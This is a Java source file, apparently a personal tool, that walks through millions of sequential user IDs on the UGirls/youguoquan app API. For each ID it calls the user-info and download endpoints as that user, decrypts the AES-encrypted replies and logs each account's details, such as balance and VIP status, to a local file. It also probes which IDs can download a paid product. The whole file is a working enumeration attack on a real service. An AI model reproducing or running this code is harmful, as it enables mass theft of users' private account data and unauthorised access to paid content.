package com.spx.dev.ugirls;

import com.google.gson.Gson;
import com.spx.dev.HttpLoader;
import com.spx.dev.HttpManager;
import okhttp3.Request;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class UGirls {
    FileWriter fw = new FileWriter("d:/data/ugirls/users_4.txt", true);
    BufferedWriter bw;

    public UGirls() throws IOException {
        bw = new BufferedWriter(fw);
    }

    public void download(String userId, String productId) {
//        String url ="https://api.youguoquan.com/ProductCritical/Critical/GetFreeContentCritical";
        String url = "https://api.youguoquan.com/Users/Common/DownLoad";
        Request request
                = HttpManager.getUGirlsPostRequest(url, userId, productId);
        String str = HttpLoader.load(request, "UTF-8");
        Gson gson = new Gson();

        String decode = decode(str);
        if (decode.contains("对不起,您没有权限进行下载")) {
            System.out.println(userId + ", " + decode);
        } else {
            throw new RuntimeException(decode + ":" + userId);
//            System.err.println("SUCCEED!!!"+userId + ", "+decode);
        }
    }

    /**
     * unicode转中文
     *
     * @param str
     * @return
     * @author yutao
     * @date 2017年1月24日上午10:33:25
     */
    public static String unicodeToString(String str) {

        Pattern pattern = Pattern.compile("(\\\\u(\\p{XDigit}{4}))");

        Matcher matcher = pattern.matcher(str);

        char ch;

        while (matcher.find()) {

            ch = (char) Integer.parseInt(matcher.group(2), 16);

            str = str.replace(matcher.group(1), ch + "");

        }

        return str;

    }

    public static String decode(String output) {
        output = EncrypterUtil.AESDecrypt(EncrypterUtil.getKey(), output);
        output = unicodeToString(output);
        return output;
    }

    public static void main(String[] args) throws IOException {
//        String json = "pUKkI+c5FnHWZp7HuM6lojGOXds2CREWhrPodskkfuv76JG59DPOC2NNKjx1AST/YOhAoyttitrGnmwjsALsBoKXVlrHy9AxzgPVN3DZyroWlKVZKevU95ztqNfvOcZNZ01Cpdg7sudDGj2wTI0c+3lwNTFAaYaYN/8OuQAoLkWaxtUM55mcQOmBTDj4xVD0bfbjuoiLxt6BQRoYWJGmuZ48JewuEt8qnDOD4/98vBch6tqZaVFatl06NPftztO/iY9hcnR9wEHs97KuN0W36HIbh+zYn2kgdqMsubQSxIyg2Y4PcbljPsCPQ0ZwxnqS8wf1PzKBFd6eubW5Dm7k7r2T2w6+1NPVPv1sgH3+j6IAWQlV74p5bk3e99pO0KMBc9UG8OQg0HCUzRNIrvZV0yUme4DQaC/6h4dHboZ+T37UgLfyfCXbO7C0JR19dvkAIoUOcLfZUcA2vuxdraXnzyLJphCebONEwwFj9CHnd2PzL7OFVIewp5/WHO9AHEUTdG+zfxKNbnClLErHRCDNzAMEzyogWIT3YbWiB/sD2m4bnejM9f61ibFZ6QbbP9lUuT0zjzghFcQRvh8wYWK9ItM5TJ4oNamKi5a2MlAFaYav0ojsywQ/A4z1ShTv69Vr0xNB0KVOBIU1+7bN3q/B22DLskcVJQCNmXMZnkY6Zr99mJR4Ib8x27wznkjWVr3qXQnXeTb1L/I9rcvvTv1Q2Vt2BJAqTJ5iutUUuH/S+lDDgOD5bzvSjhVpCvk/TFn7W5y0ECKzNnR30FRQql86pUVM+RS+fDrC1zkJ98ZSkRwD5a7HG4/et+FArp7SY+qONDRUYFGBrCnTtD1Y9w/DQkm+AIM4TQdEnoJB5nn5yjhbE5QFkm3LKwqoTYj6LXzk1AQN42ppMFOuDD5/mZZG54Pc1Kp2TxKQGRp9s538FlG4ig16dWPjuQ5YNXG/iJCFsUx0aTHwzxl/l+7AZ+qQvxIV+8pdRNprEt+ZeqUOmEWJastvgn16K06MUZ5dDr2d0rqGrfzpcRRZyH2EDCozQWWDNMq3TQPn8zY3aY8KgDECMrRP5/aVo+NJ8n5iVFX3ZQB+tFXhqdx1srdc1lAI3JNC0erVYAcihpwU4VCoA7gaOREQJymqrbavt5GZEREwL7AAQhwVQBREP3ByvQtRbfFqZlAXzidX5kdfUBwnXSFmNMhGxpurXh+8vg910ljLxVjGc3gTFeosTi4nXTa/Ew5xma8QyuNeHhQs9EpVxeopnEs6q8Wwm8w2KnfD8MQbTQCS/eDybUzyI3x7Rbw3+w==";
//        try {
//            json = EncrypterUtil.AESDecrypt(EncrypterUtil.getKey(), json);
//            json = unicodeToString(json);
//            System.out.println("onCreate: json:" + json);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//
//        System.out.println("我是中文");

        UGirls uGirls = new UGirls();
        uGirls.tryUserInfo();
//        uGirls.getUserInfo("2000152");
    }

    public void appendData(String str) {
        try {
            bw.append(str + "\r\n");
            bw.flush();
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    private void getUserInfo(String userId) {
        try {
            String url = "https://api.youguoquan.com/Users/Common/GetInfo";

            Request request
                    = HttpManager.getUGirlsPostRequest(url, userId, "1888");
            String str = HttpLoader.load(request, "UTF-8");
            Gson gson = new Gson();

            String decode = decode(str);
            appendData(userId + "," + decode);

            UserInfo userInfo = gson.fromJson(decode, UserInfo.class);
            UserInfo.UserInfoBean realInfo = userInfo.getUserInfo();
            String dBalance = realInfo.getDBalance();
            UserInfo.UserInfoBean.RoleBean role = realInfo.getRole();
            int iIsVip = role.getIIsVip();
            System.out.println(userId + ", balance:" + dBalance + ", vip:" + iIsVip + "," + decode);

        } catch (Exception ex) {
            ex.printStackTrace();
            appendData(userId + ",FAIL");
        }
    }

    private void tryDownload() {

        for (int i = 2000153; i <= 5000000; i++) {

            try {
                String sUserId = i + "";
                download(sUserId, "1954");
                Thread.sleep(40);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private void tryUserInfo() {

        for (int i = 4000000; i <= 5000000; i++) {

            try {
                String sUserId = i + "";
                getUserInfo(sUserId);
                Thread.sleep(200);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        try {
            fw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
